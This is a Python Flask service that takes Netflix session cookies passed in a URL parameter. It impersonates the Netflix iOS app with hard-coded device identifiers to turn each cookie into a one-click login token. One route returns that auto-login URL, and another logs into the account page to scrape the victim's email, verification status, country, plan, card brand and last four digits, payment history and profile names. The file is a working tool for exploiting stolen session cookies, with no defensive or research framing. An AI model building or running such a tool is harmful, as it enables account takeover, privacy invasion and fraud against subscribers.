import requests
import os
import re
import json
import urllib.parse
from datetime import datetime
from flask import Flask, request, jsonify
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

app = Flask(__name__)

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
CHECK_URL = "https://www.netflix.com/api/shakti/mre/pathEvaluator"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

COUNTRY_FLAGS = {
    "US": "🇺🇸", "IN": "🇮🇳", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺",
    "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "BR": "🇧🇷",
    "MX": "🇲🇽", "JP": "🇯🇵", "KR": "🇰🇷", "NL": "🇳🇱", "SE": "🇸🇪",
    "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱", "TR": "🇹🇷",
    "AR": "🇦🇷", "CO": "🇨🇴", "CL": "🇨🇱", "PH": "🇵🇭", "ID": "🇮🇩",
    "TH": "🇹🇭", "MY": "🇲🇾", "SG": "🇸🇬", "PK": "🇵🇰", "BD": "🇧🇩",
    "NG": "🇳🇬", "ZA": "🇿🇦", "EG": "🇪🇬", "SA": "🇸🇦", "AE": "🇦🇪",
    "PT": "🇵🇹", "RO": "🇷🇴", "CZ": "🇨🇿", "HU": "🇭🇺", "GR": "🇬🇷",
    "UA": "🇺🇦", "RU": "🇷🇺", "IL": "🇮🇱", "VN": "🇻🇳", "NZ": "🇳🇿",
    "BE": "🇧🇪", "AT": "🇦🇹", "CH": "🇨🇭", "IE": "🇮🇪", "HK": "🇭🇰",
    "TW": "🇹🇼", "CN": "🇨🇳", "LK": "🇱🇰", "NP": "🇳🇵", "MM": "🇲🇲",
    "KH": "🇰🇭", "LA": "🇱🇦", "BN": "🇧🇳", "MN": "🇲🇳", "AF": "🇦🇫",
    "IQ": "🇮🇶", "IR": "🇮🇷", "JO": "🇯🇴", "KW": "🇰🇼", "LB": "🇱🇧",
    "OM": "🇴🇲", "QA": "🇶🇦", "SY": "🇸🇾", "YE": "🇾🇪", "BH": "🇧🇭",
    "KE": "🇰🇪", "GH": "🇬🇭", "ET": "🇪🇹", "TZ": "🇹🇿", "UG": "🇺🇬",
    "DZ": "🇩🇿", "MA": "🇲🇦", "TN": "🇹🇳", "LY": "🇱🇾", "SD": "🇸🇩",
    "PE": "🇵🇪", "VE": "🇻🇪", "EC": "🇪🇨", "BO": "🇧🇴", "PY": "🇵🇾",
    "UY": "🇺🇾", "CR": "🇨🇷", "PA": "🇵🇦", "GT": "🇬🇹", "HN": "🇭🇳",
    "SV": "🇸🇻", "NI": "🇳🇮", "DO": "🇩🇴", "CU": "🇨🇺", "JM": "🇯🇲",
    "PL": "🇵🇱", "BG": "🇧🇬", "HR": "🇭🇷", "RS": "🇷🇸", "SK": "🇸🇰",
    "SI": "🇸🇮", "LT": "🇱🇹", "LV": "🇱🇻", "EE": "🇪🇪", "BY": "🇧🇾",
    "MD": "🇲🇩", "AL": "🇦🇱", "MK": "🇲🇰", "BA": "🇧🇦", "ME": "🇲🇪",
    "XK": "🇽🇰", "IS": "🇮🇸", "LU": "🇱🇺", "MT": "🇲🇹", "CY": "🇨🇾",
    "GE": "🇬🇪", "AM": "🇦🇲", "AZ": "🇦🇿", "KZ": "🇰🇿", "UZ": "🇺🇿",
    "TM": "🇹🇲", "KG": "🇰🇬", "TJ": "🇹🇯",
}

def decode_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for c in data:
                if c.get("name") in COOKIE_KEYS:
                    cookie_dict[c["name"]] = decode_value(c.get("value", ""))
        elif isinstance(data, dict):
            for key in COOKIE_KEYS:
                if key in data:
                    cookie_dict[key] = decode_value(data[key])
    except:
        pass
    for key in COOKIE_KEYS:
        if key not in cookie_dict:
            match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
            if match:
                cookie_dict[key] = decode_value(match.group(1))
    return cookie_dict

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        raise ValueError("Missing NetflixId in cookie")
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=30, verify=False)
    response.raise_for_status()
    data = response.json()
    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
    token = token_data.get("token")
    expires = token_data.get("expires")
    if not token:
        raise ValueError("No token found in response")
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000
    return token, expires

def format_expiry(expires):
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(expires)

def get_flag(country_code):
    return COUNTRY_FLAGS.get(country_code.upper(), "🌍") if country_code else "🌍"

@app.route("/withdraw", methods=["GET"])
def withdraw():
    cookie_raw = request.args.get("cookie", "")
    if not cookie_raw:
        return jsonify({"error": "No cookie provided"}), 400
    try:
        cookie_dict = extract_cookie_dict(cookie_raw)
        token, expires = fetch_nftoken(cookie_dict)
        login_url = "https://netflix.com/?nftoken=" + token
        expiry = format_expiry(expires)
        return jsonify({"url": login_url, "expires": expiry, "token": str(token)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/scrape", methods=["GET"])
def scrape():
    cookie_raw = request.args.get("cookie", "")
    if not cookie_raw:
        return jsonify({"error": "No cookie provided"}), 400
    try:
        cookie_dict = extract_cookie_dict(cookie_raw)
        token, expires = fetch_nftoken(cookie_dict)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
        }

        # Page 1 - Account page
        account_url = "https://www.netflix.com/account?nftoken=" + token
        response = requests.get(account_url, headers=headers, timeout=30, verify=False, allow_redirects=True)
        html = response.text

        # Get session cookies from account page
        session_cookies = response.cookies

        # Page 2 - Security page for email verified
        security_url = "https://www.netflix.com/account/security"
        response2 = requests.get(security_url, headers=headers, cookies=session_cookies, timeout=30, verify=False)
        html2 = response2.text

        # Page 3 - Billing page for payment history
        billing_url = "https://www.netflix.com/billingActivity"
        response3 = requests.get(billing_url, headers=headers, cookies=session_cookies, timeout=30, verify=False)
        html3 = response3.text

        result = {}

        # Email
        for p in [r'"userLogin"\s*:\s*"([^"]+)"', r'"emailAddress"\s*:\s*"([^"]+)"']:
            m = re.search(p, html)
            if m:
                result["email"] = m.group(1).replace("\\x40", "@").replace("\\u0040", "@")
                break

        # Email verified - check security page HTML text
        if "Verified" in html2 or '"emailVerified":true' in html2 or '"emailVerified": true' in html2:
            result["email_verified"] = "✅ Verified"
        else:
            result["email_verified"] = "❌ Not Verified"

        # Phone verified
        if "Mobile phone" in html2 and ("Verified" in html2 or len(re.findall(r'\d{5}\s*\d{5}', html2)) > 0):
            result["phone_verified"] = "✅ Verified"
        else:
            result["phone_verified"] = "❌ Not Verified"

        # Country
        m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html)
        if m:
            country = m.group(1)
            result["country"] = get_flag(country) + " " + country

        # Member since
        m = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html)
        if m:
            result["member_since"] = m.group(1).replace("\\x20", " ").replace("\\u0020", " ")

        # Status
        m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
        if m:
            s = m.group(1)
            result["status"] = "✅ Active" if "CURRENT" in s else "❌ Expired"

        # Plan
        for p in [r'"planName"\s*:\s*"([^"]+)"', r'"subscriptionPlan"\s*:\s*"([^"]+)"']:
            m = re.search(p, html)
            if m:
                result["plan"] = m.group(1)
                break
        if "plan" not in result:
            for plan in ["Premium", "Standard with ads", "Standard", "Basic"]:
                if plan.lower() in html.lower():
                    result["plan"] = plan
                    break

        # Payment - card type + last4
        card_type = ""
        last4 = ""
        for p in [r'"cardType"\s*:\s*"([^"]+)"', r'"brand"\s*:\s*"([^"]+)"', r'"cardBrand"\s*:\s*"([^"]+)"']:
            m = re.search(p, html)
            if m:
                card_type = m.group(1)
                break
        for p in [r'"last4Digits"\s*:\s*"([^"]+)"', r'"last4"\s*:\s*"([^"]+)"', r'"lastFourDigits"\s*:\s*"([^"]+)"']:
            m = re.search(p, html)
            if m:
                last4 = m.group(1)
                break

        # Also check billing page for last4
        if not last4:
            m = re.search(r'(\d{4})\s*</td>', html3)
            if m:
                last4 = m.group(1)

        if card_type and last4:
            result["payment"] = f"{card_type} - {last4}"
        elif card_type:
            result["payment"] = card_type
        else:
            for p in [r'"paymentMethodType"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"']:
                m = re.search(p, html)
                if m:
                    ptype = m.group(1).upper()
                    if "UPI" in ptype:
                        result["payment"] = "UPI"
                    elif "PAYPAL" in ptype:
                        result["payment"] = "PayPal"
                    elif "SEPA" in ptype:
                        result["payment"] = "SEPA"
                    elif "GOOGLE" in ptype:
                        result["payment"] = "Google Pay"
                    elif "APPLE" in ptype:
                        result["payment"] = "Apple Pay"
                    else:
                        result["payment"] = ptype
                    break
            if "payment" not in result:
                m = re.search(r'(Mastercard|Visa|PayPal|AMEX|Discover|UPI|SEPA)[^\d]*(\d{4})?', html, re.IGNORECASE)
                if m:
                    result["payment"] = f"{m.group(1)} - {m.group(2)}" if m.group(2) else m.group(1)
                else:
                    result["payment"] = "Unknown"

                # Payment history - only from payment history table not upcoming
        # Skip the first amount (upcoming billing) get only past payments
        amounts = re.findall(r'[₹$€£¥]\s*([\d,]+(?:\.\d{2})?)', html3)
        
        currency = ""
        currency_match = re.search(r'([₹$€£¥])\s*[\d]', html3)
        if currency_match:
            currency = currency_match.group(1)

        seen = []
        clean_amounts = []
        for a in amounts:
            a_clean = a.replace(",", "")
            try:
                val = float(a_clean)
                if val > 50 and a not in seen:
                    seen.append(a)
                    clean_amounts.append(currency + a)
            except:
                pass

        # Skip first amount (upcoming billing amount)
        if len(clean_amounts) > 1:
            clean_amounts = clean_amounts[1:]

        # Only get whole amounts not tax amounts
        # Tax amounts are usually smaller like 422.88 vs 499
        final_amounts = []
        for a in clean_amounts:
            # Skip tax amounts (usually decimal and smaller)
            num = float(a.replace(currency, "").replace(",", ""))
            if not (num < max([float(x.replace(currency, "").replace(",", "")) for x in clean_amounts]) * 0.9 and "." in a):
                final_amounts.append(a)

        if final_amounts:
            result["payment_history"] = ", ".join(final_amounts[:3])
        else:
            result["payment_history"] = "Unknown"

        # Extra members
        m = re.search(r'"extraMemberCount"\s*:\s*(\d+)', html)
        if m:
            count = int(m.group(1))
            result["extra_members"] = f"Yes ✅ ({count})" if count > 0 else "No ❌"
        else:
            result["extra_members"] = "No ❌"

        # Profiles
        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html)
        result["profiles"] = ", ".join(list(set(profiles))) if profiles else "Unknown"

        result["token"] = token
        result["expires"] = format_expiry(expires)

        return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
